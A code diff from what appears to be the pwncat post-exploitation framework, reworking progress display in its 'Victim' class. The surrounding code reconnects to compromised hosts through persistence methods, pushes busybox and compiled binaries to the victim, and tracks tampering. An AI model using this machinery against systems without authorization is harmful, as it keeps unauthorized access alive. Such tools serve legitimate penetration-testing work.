@@ -195,25 +195,39 @@ class Victim:
         if self.host is None:
             raise persist.PersistenceError("{hostid}: invalid host hash")
 
-        for username, method in self.persist.installed:
-            if requested_method and requested_method != method.name:
-                continue
-            if requested_user and (
-                (requested_user != "root" and method.system)
-                or (requested_user != username)
-            ):
-                continue
-            try:
-                util.progress(
-                    f"attempting host reconnection via {method.format(username)}"
+        with Progress(
+            "[bold]reconnecting[/bold]: {task.fields[method]}",
+            BarColumn(bar_width=None),
+            "[progress.percentage]{task.percentage:>3.1f}%",
+        ) as progress:
+            installed_methods = list(self.persist.installed)
+            task_id = progress.add_task(
+                "attempt", method="initializing", total=len(installed_methods)
+            )
+            for username, method in self.persist.installed:
+                progress.update(
+                    task_id, method=f"[cyan]{method.format(username)}[/cyan]"
                 )
-                sock = method.reconnect(username)
-                self.connect(sock)
-                return
-            except persist.PersistenceError:
-                continue
+                if requested_method and requested_method != method.name:
+                    continue
+                if requested_user and (
+                    (requested_user != "root" and method.system)
+                    or (requested_user != username)
+                ):
+                    continue
+                try:
+                    sock = method.reconnect(username)
+                    progress.update(
+                        task_id, completed=len(installed_methods),
+                    )
+                    break
+                except persist.PersistenceError:
+                    continue
+            else:
+                raise persist.PersistenceError("no working persistence methods found")
 
-        raise persist.PersistenceError("no working persistence methods found")
+        # Perform connection initialization for this new victim
+        self.connect(sock)
 
     @property
     def connected(self):
@@ -252,8 +266,9 @@ class Victim:
         # self.client.settimeout(1)
 
         with Progress(
-            "initializing: [cyan]{task.fields[status]}[/cyan]",
+            "initializing: {task.fields[status]}",
             BarColumn(bar_width=None),
+            "[progress.percentage]{task.percentage:>3.1f}%",
         ) as progress:
 
             task_id = progress.add_task("initializing", total=7, status="hostname")
@@ -447,14 +462,16 @@ class Victim:
                 TimeRemainingColumn(),
             ) as progress:
                 # Create the progress task
-                task_id = progress.add_task("download",)
+                task_id = progress.add_task("download", start=False)
 
                 # Attempt to download the busybox binary
                 r = requests.get(busybox_url.format(arch=self.host.arch), stream=True)
 
                 # No busybox support
                 if r.status_code == 404:
-                    util.warn(f"no busybox for architecture: {self.host.arch}")
+                    progress.log(
+                        f"[red]error[/red]: no busybox for [cyan]{self.host.arch}[/cyan]"
+                    )
                     return
 
                 # Grab the original_content length if provided
@@ -609,9 +626,10 @@ class Victim:
             try:
                 self.env(["rm", "-rf", self.host.busybox])
             except FileNotFoundError:
-                util.warn(
-                    f"rm not found! {self.host.busybox} not removed from filesystem."
+                console.log(
+                    f"[red]error[/red]: [cyan]rm[/cyan] not found; adding tamper for {self.host.busybox}"
                 )
+                self.tamper.created_file(self.host.busybox)
 
             self.host.busybox = None
             self.host.busybox_uploaded = False
@@ -831,8 +849,6 @@ class Victim:
 
         if cross is not None and os.path.isfile(cross):
             # Attempt compilation locally
-            util.progress("attempting local compilation")
-
             real_sources = []
             local_temps = []
 
@@ -870,7 +886,6 @@ class Victim:
 
             # Run GCC and grab the output
             try:
-                util.progress(f"attempting local compilation: compiling sources")
                 subprocess.run(command, check=True, capture_output=True)
             except subprocess.CalledProcessError as exc:
                 raise util.CompilationError(True, exc.stdout, exc.stderr)
@@ -878,7 +893,6 @@ class Victim:
             # We have a compiled executable. We now need to upload it.
             length = os.path.getsize(local_output)
             with open(local_output, "rb") as source:
-                util.progress(f"attempting local compilation: uploaded compiled binary")
                 # Decide on a name
                 if output is not None and output.startswith("/"):
                     # Absolute path
@@ -892,10 +906,7 @@ class Victim:
                 with dest:
                     shutil.copyfileobj(source, dest, length=length)
 
-            util.progress(f"attempting local compilation: marking binary executable")
             self.env(["chmod", "+x", remote_path])
-
-            util.erase_progress()
 
             return remote_path
 
@@ -904,14 +915,11 @@ class Victim:
         if gcc is None:
             raise util.CompilationError(False, None, None)
 
-        util.progress("attempting remote compilation")
-
         # We have a remote compiler. We need to get the sources to the remote host
         real_sources = []
         for source in sources:
             # Upload or write data
             if isinstance(source, str):
-                util.progress(f"attempting remote compilation: uploading {source}")
                 with open(source, "rb") as src:
                     with self.tempfile(
                         "wb", length=os.path.getsize(source), suffix=".c"
@@ -919,7 +927,6 @@ class Victim:
                         shutil.copyfileobj(src, dest)
                         real_sources.append(dest.name)
             else:
-                util.progress(f"attempting remote compilation: uploading source data")
                 with self.tempfile("w", suffix=".c") as dest:
                     shutil.copyfileobj(source, dest)
                     real_sources.append(dest.name)
@@ -933,18 +940,14 @@ class Victim:
         command = [gcc, "-o", remote_path, *cflags, *real_sources, *ldflags]
         command = shlex.join(command) + f" 2>&1 || echo '__pwncat_gcc_failed__'"
 
-        util.progress("attempting remote compilation: compiling...")
         with self.subprocess(command, "r") as pipe:
             stdout = pipe.read().decode("utf-8")
 
-        util.progress("attempting remote compilation: removing temp files")
         self.env(["rm", "-f", *real_sources])
 
         if "__pwncat_gcc_failed__" in stdout:
             self.env(["rm", "-f", remote_path])
             raise util.CompilationError(True, stdout, stdout)
-
-        util.erase_progress()
 
         return remote_path
 
